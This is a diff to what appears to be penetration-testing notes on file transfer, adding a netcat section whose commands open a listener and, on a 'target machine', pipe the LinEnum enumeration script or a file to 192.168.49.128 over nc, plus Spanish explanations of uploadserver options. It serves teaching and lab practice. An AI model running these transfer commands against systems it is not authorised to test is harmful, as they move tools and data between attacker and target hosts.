@@ -169,6 +169,26 @@ Finally, we close the file descriptor to release the resources associated with i
   exec 3<&-
 ```
 
+## Net Cat Alternative
+
+Open a listener on your machine and redirect the output to a file.
+
+```bash
+  nc -lvnp 80 > /tmp/LinEnum.sh
+```
+
+In the target machine, use `wget` or `curl` to send the file content to your listener.
+
+```bash
+  wget -qO- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | nc 192.168.49.128 80
+```
+
+Or use  `nc` directly without wget or curl.
+
+```bash
+  nc 192.168.49.128 80 < LinEnum.sh
+```
+
 ## Web Upload
 
 ```bash
@@ -195,6 +215,12 @@ Este comando genera un certificado autofirmado y una clave privada en un solo ar
 Resultado: Se crea un archivo server.pem que contiene tanto el certificado autofirmado como la clave privada, útil para pruebas o servidores locales.
 
 > Nota: Si da error al intentar iniciar el servidor, presentar la ruta absoluta de python3, por ejemplo: `/usr/bin/python3 -m uploadserver 443 --server-certificate ~/server.pem`
+
+- `--directory`: Especifica el directorio donde se guardarán los archivos subidos. Si no se proporciona, se usará el directorio actual.
+- `--server-certificate`: Especifica el archivo de certificado SSL para habilitar HTTPS. Si se proporciona, el servidor se ejecutará en modo seguro.
+- `--basic-auth`: Habilita la autenticación básica HTTP. Si se proporciona, se solicitará un nombre de usuario y contraseña para acceder al servidor.
+- `--basic-auth-upload`: Habilita la autenticación básica solo para la ruta de carga. Si se proporciona, se solicitará autenticación solo para subir archivos,mientras que la descarga seguirá siendo pública.
+
 
 ### Linux - Upload Multiple Files
 
